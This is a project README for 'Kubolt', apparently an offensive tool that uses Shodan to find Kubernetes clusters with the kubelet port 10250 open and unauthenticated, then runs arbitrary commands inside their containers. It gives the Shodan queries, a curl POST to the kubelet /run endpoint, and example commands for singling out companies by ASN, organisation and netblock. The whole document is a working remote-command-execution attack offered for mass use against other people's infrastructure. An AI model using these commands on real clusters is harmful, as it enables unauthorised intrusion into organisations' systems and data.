# Wat?
**Kubolt** utility to scan public unauthinticated kubernetes clusters and run commands inside containers

# Why?
If the cluster exposed port 10250 to internet it's possible to use getrun function from [kubelet](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go) and run commands inside containers:
```go
// getRun handles requests to run a command inside a container.
func (s *Server) getRun(request *restful.Request, response *restful.Response) {
	params := getExecRequestParams(request)
	pod, ok := s.host.GetPodByName(params.podNamespace, params.podName)
	if !ok {
		response.WriteError(http.StatusNotFound, fmt.Errorf("pod does not exist"))
		return
	}
```

# How?
Okay, let's ask our friend Shodan :trollface:
The basic query is 
>ssl:true port:10250 404 

**Kubelet** use port 10250 with SSL by default, 404 is the HTTP response without URL path. 

**Kubolt** ask Shodan by API for list of IP addresses and keep them for other OSINT actions :grin:
Next it generate request as below:
```bash
curl -XPOST -k https://IP-from-Shodan:10250/run/<namespace>/<PodName>/<containerName> -d "cmd=<command-to-run>" 
```
You could target companies more accurate using Shodan filters like this:
- asn
- org
- country
- net

To do it use query like this:
```python
python kubolt.py --query "asn:123123 org:'ACME Corporation'"
#Recently Shodan added kuberentes as product filter, but it's not reveal all the possible open clusters.
python kubolt.py --query "net:1.2.3.4/16 product:kubernets"
```


# Demo
![demo](/github-scale.gif)
